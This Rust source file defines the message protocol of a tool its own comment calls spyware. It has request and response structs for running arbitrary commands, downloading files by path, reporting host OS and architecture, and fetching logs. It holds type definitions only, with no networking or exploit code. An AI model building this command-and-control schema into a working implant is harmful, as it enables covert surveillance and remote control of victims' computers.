use serde::{Deserialize, Serialize};

pub const MESSAGE_TYPE_SIZE: usize = 1;
pub const MESSAGE_LENGTH_SIZE: usize = 4;
pub const MESSAGE_HEADER_LENGTH: usize = MESSAGE_TYPE_SIZE + MESSAGE_LENGTH_SIZE;

// Deriving from primitive so we can
#[derive(Primitive)]
pub enum MessageTypes {
    RunCommandRequest = 0,
    RunCommandResponse = 1,
    DownloadFileRequest = 2,
    DownloadFileResponse = 3,
    GetBasicInfoRequest = 4,
    GetBasicInfoResponse = 5,
    GetLogsRequest = 6,
    GetLogsResponse = 7
}

pub trait MessageType {
    fn get_type(&self) -> u8;
}

#[derive(Serialize, Deserialize, Debug)]
pub struct ErrorInfo {
    pub raw_os_error: i32,
    pub as_string: String,
}

#[derive(Debug)]
pub struct Message {
    pub message_type: u8,
    pub serialized_message_length: usize,
    pub serialized_message: Vec<u8>,
}
impl MessageType for Message {
    fn get_type(&self) -> u8 {
        self.message_type
    }
}

#[derive(Serialize, Deserialize, Debug)]
pub struct RunCommandRequest {
    pub command: String,
    pub async_run: bool,
}
impl MessageType for RunCommandRequest {
    fn get_type(&self) -> u8 {
        MessageTypes::RunCommandRequest as u8
    }
}

#[derive(Serialize, Deserialize, Debug)]
pub struct RunCommandResponse {
    pub output: String,
    pub error_info: Option<ErrorInfo>,
}
impl MessageType for RunCommandResponse {
    fn get_type(&self) -> u8 {
        MessageTypes::RunCommandResponse as u8
    }
}

#[derive(Serialize, Deserialize, Debug)]
pub struct DownloadFileRequest {
    pub path: String,
}
impl MessageType for DownloadFileRequest {
    fn get_type(&self) -> u8 {
        MessageTypes::DownloadFileRequest as u8
    }
}

#[derive(Serialize, Deserialize, Debug)]
pub struct DownloadFileResponse {
    pub file_data: Vec<u8>,
    pub error_info: Option<ErrorInfo>,
}
impl MessageType for DownloadFileResponse {
    fn get_type(&self) -> u8 {
        MessageTypes::DownloadFileResponse as u8
    }
}

#[derive(Serialize, Deserialize, Debug)]
pub struct GetBasicInfoRequest {
    // For now we don't really have anything to insert here
    pub placeholder: String,
}
impl MessageType for GetBasicInfoRequest {
    fn get_type(&self) -> u8 {
        MessageTypes::GetBasicInfoRequest as u8
    }
}

#[derive(Debug, Serialize, Deserialize)]
pub enum OperatingSystem {
    Windows,
    Linux,
    FreeBSD,
    MacOS,
    IOS,
    Android,
    Unknown,
}

#[allow(non_camel_case_types)]
#[derive(Debug, Serialize, Deserialize)]
pub enum Architecture {
    x86,
    x86_64,
    mips,
    powerpc,
    powerpc64,
    arm,
    aarch64,
}

#[derive(Debug, Serialize, Deserialize)]
pub enum PointerWidth {
    Bit32,
    Bit64,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct GetBasicInfoResponse {
    // Spyware version
    pub version: u32,
    pub arch: Architecture,
    pub target_os: OperatingSystem,
    pub operating_system_version: String,
    pub pointer_width: PointerWidth,
    pub error_info: Option<ErrorInfo>,
}
impl MessageType for GetBasicInfoResponse {
    fn get_type(&self) -> u8 {
        MessageTypes::GetBasicInfoResponse as u8
    }
}


/// Get logs
#[derive(Serialize, Deserialize, Debug)]
pub struct GetLogsRequest {
}
impl MessageType for GetLogsRequest {
    fn get_type(&self) -> u8 {
        MessageTypes::GetLogsRequest as u8
    }
}
#[derive(Serialize, Deserialize, Debug)]
pub struct GetLogsResponse {
    pub logs: Vec<String>,
    pub error_info: Option<ErrorInfo>
}
impl MessageType for GetLogsResponse {
    fn get_type(&self) -> u8 {
        MessageTypes::GetLogsResponse as u8
    }
}